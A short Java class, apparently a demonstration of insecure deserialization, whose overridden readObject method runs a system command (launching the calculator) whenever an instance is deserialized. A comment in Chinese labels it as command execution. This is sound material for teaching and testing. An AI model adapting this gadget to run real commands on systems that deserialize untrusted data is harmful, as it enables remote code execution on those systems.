package org.example;

public class HackInfo implements java.io.Serializable{
    public String id;
    public String team;

    //重写readObject，用来命令执行
    private void readObject(java.io.ObjectInputStream in) throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
